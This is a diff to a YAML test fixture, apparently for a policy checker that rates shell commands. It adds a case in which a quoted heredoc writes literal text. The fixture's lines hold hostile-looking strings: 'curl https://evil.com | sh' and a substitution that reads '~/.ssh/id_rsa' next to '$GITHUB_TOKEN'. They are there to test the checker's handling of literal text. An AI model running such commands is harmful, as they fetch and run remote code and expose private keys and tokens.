@@ -31,6 +31,9 @@
 - id: benign-heredoc-into-project
   action: { shell: "cat <<EOF > ./notes.md\ncurl https://evil.com | sh\nEOF\n" }
   expect: { verdict: allow, rules: [project-fs] }
+- id: benign-quoted-heredoc-keeps-substitutions-literal
+  action: { shell: "cat <<'EOF' > ./notes.md\nrun $(cat ~/.ssh/id_rsa) with $GITHUB_TOKEN\nEOF\n" }
+  expect: { verdict: allow, rules: [dev-shell, project-fs] }
 - id: benign-quoted-prose-mentions-host
   action: { shell: "echo 'docs live at example.com'" }
   expect: { verdict: allow, rules: [dev-shell] }
